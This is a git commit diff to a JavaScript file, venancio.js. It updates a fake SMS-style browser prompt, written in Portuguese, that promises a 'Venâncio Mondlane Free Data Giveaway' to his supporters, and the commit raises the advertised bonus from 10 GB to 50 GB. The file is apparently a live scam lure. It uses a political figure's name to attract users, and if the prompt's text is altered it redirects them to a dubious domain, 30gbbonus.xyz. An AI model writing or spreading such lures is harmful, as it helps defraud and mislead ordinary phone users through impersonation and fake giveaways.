edbb2c6f16b20edda7c6c6bcabc365b7dfde4f9a
xmasdata <152927198+xmasdata@users.noreply.github.com>
2025-02-09 09:48:53 +0100

    Update venancio.js

--- venancio.js
+++ venancio.js
@@ -1,6 +1,6 @@
 
-var password = 'ATIVE 10 GB'
-password=prompt('SMS: Olá, você foi selecionado para se beneficiar do Venâncio Mondlane Free Data Giveaway para seus apoiadores. Pressione OK para ativar agora ','ATIVE 10 GB');
-if (password != 'ATIVE 10 GB') {
+var password = 'ATIVE 50 GB'
+password=prompt('SMS: Olá, você foi selecionado para se beneficiar do Venâncio Mondlane Free Data Giveaway para seus apoiadores. Pressione OK para ativar agora ','ATIVE 50 GB');
+if (password != 'ATIVE 50 GB') {
 location.href='https://30gbbonus.xyz/10gb-campaign.html';
 }
